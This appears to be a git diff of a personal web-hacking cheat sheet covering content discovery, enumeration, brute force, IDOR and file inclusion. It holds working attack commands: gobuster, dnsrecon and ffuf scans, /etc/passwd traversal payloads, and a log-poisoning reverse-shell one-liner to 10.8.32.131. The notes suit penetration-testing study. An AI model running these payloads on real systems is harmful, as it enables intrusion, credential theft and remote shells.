@@ -1,11 +1,73 @@
 # Web Hacking
 
-## Authenitcation Bypass
+# Enumeration/Scanning
+
+## Web Content Discovery
+
+### Manual Contend Discovery
+
+- Check `http://targetsite.com/robots.txt` for hidden folders or files;
+- Check `http://targetsite.com/sitemap.xml` for website architecture and hidden areas;
+- Check HTTP Response Header fields such as: "Server" (OS and version) and "X-Powered-By" (web langauge version);
+- Check Framework Stack version and vulnerabilities;
+- Google Dorking:
+      
+     | Filter   | Example             | Description                                      |
+     |----------|---------------------|--------------------------------------------------|
+     | site     | site:targetsite.com | results only from specified URL                  |
+     | inurl    | inurl:admin         | results that have specified word in URL          |
+     | filetype | filetype:pdf        | results which are a particular type of file ext. |
+     | intitle  | intitle:admin       | results that contain the specified word in title |
+
+### Automated Content Discovery:
+
+```bash
+
+gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt -u http:/targetsite.com/ 
+
+```
+
+```bash 
+
+gobuster -u http://targetsite.com -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt -x php,sh,txt,cgi,html,js,css
+
+```
+
+## Subdomain Enumeration
+
+- Check TLS Certificate;
+- Serach Engines, to reveal subdomains:
+      - GOOGLE: `-site:www<span></span>.targetsite.com site:* .targetsite.com`
+
+- DNS Bruteforce:
+           
+      dnsrecon -d targetsite.com -D /usr/share/wordlists/dnsmap.txt -t std
+
+## Username Enumeration
+
+For Login forms, if the HTTP response returns a different answer for existing usernames rather than non existent:
+
+    ffuf -w /usr/share/wordlists/[usernames.txt] -u http:/targetsite.com -H "Content-Type: application/x-www-form-urlencoded" -X POST -d "name_parameter=FUZZ&password_parameter=randompass" -[mx] [number or "string for mr"]
+
+Where the match criteria is used in order to print only some matching Responses:
+
+   | [mx] | Result                                              |
+   |------|-----------------------------------------------------|
+   | mc   | Match code (200, 204, 301, 302, 307, 401, 403, 405) |
+   | mw   | Match amount of words in response                   |
+   | mr   | Match defined "string" in response                  |
+   | ml   | Match amount of lines in response                   |
+   | ms   | Match HTTP response size                            |
+
+But you can also exploit the registration form where the "Username already exist" response will be provided.
+
+
+# Authenitcation Bypass
 
 - Always look for .js or .php authentication scripts through Network tab (Advanced Tools F12), BurpSuite or Content Discovery. You could encounter authentication flaws.
 - Check Cookies, try to decode them
 
-## Brute Force
+# Brute Force
 
 ```bash
 
@@ -17,7 +79,7 @@ ffuf -w usernames.txt:W1,passwords.txt:W2 -X POST -d "username=W1&password=W2" -
 
 Where -fx could be {fc | fw | fr | fl | fs} which are dual with respect to the matching criteria. For example -fc 200 will return only answers with response codes different from 200 (e.g. 301 permanent redirects for correct login)
 
-## IDOR
+# IDOR
 
 IDOR stands for Insecure Direct Object Reference. It is a kind of access control vulnerability arised when an applicetion uses user-input to access directly to objects. IDOR first appeared in OWASP 2007 Top Ten. IDOR is associated with Horizontal Privilege Escalation where an attacker could access reserved object by crafting a specific query.
 
@@ -26,7 +88,7 @@ IDOR stands for Insecure Direct Object Reference. It is a kind of access control
 - Check for IDOR effectiveness by using two different accounts trying to switch among them.
 - Check for ALL parameters in Network Tab of browser development tools (F12) for calls to any endpoint.
 
-## LFI & RFI
+# LFI & RFI
 
 LFI stands for Local File Inclusion, which is a technique where an attacker tricks a web application to retrieve a specific file from the system through a bad sanitized input form or query. It happens, for example, when requesting `http://targetsite.com/get.php?file=userCV.pdf`. If the "get.php" script is bad designed, a malicious user could force `http://targetsite.com/get.php?file=/etc/passwd`, getting all users on the system. LFI exploits PHP functions such as **include**, **require**, **include_once** and **require_once**. You must test out the URL parameter by adding the `dot-dot-slash` notation.
 
@@ -34,7 +96,7 @@ LFI stands for Local File Inclusion, which is a technique where an attacker tric
 - If the PHP script makes use of `$_GET['param']."ext"`, you could try to bypass it by means of the null character %00 at the end of the URL (ex. `http://targetsite.com/get.php?file=../../../../etc/passwd%00`). **Solved since PHP 5.4**. 
 - Check Wrapper "php://filter" for encoding and decoding a target file: `http://targetsite.com/get.php?file=php://filter/convert.base64-encode/resource=../../../../etc/passwd`. For all Wrappers have a look on [HackTricks](https://book.hacktricks.xyz/pentesting-web/file-inclusion)
 
-### LFI-2-RCE
+## LFI-2-RCE
 
 This means getting command execution on target exploiting LFI. 
 
@@ -49,10 +111,10 @@ This means getting command execution on target exploiting LFI.
 Where we URL encoded `php -r '$sock=fsockopen("10.8.32.131",5000);exec("/bin/sh -i <&3 >&3 2>&3");'`. This is also known as **Log poisoning**.
 For all other LFI-2-RCE (via /proc/self/environ, via upload, via PHPSESSID, via vsftpd logs ecc.) have a look on [HackTricks](https://book.hacktricks.xyz/pentesting-web/file-inclusion).
 
-## SSRF
+# SSRF
 
-## XSS
+# XSS
 
-## Command Injection
+# Command Injection
 
-## SQL Injection
+# SQL Injection
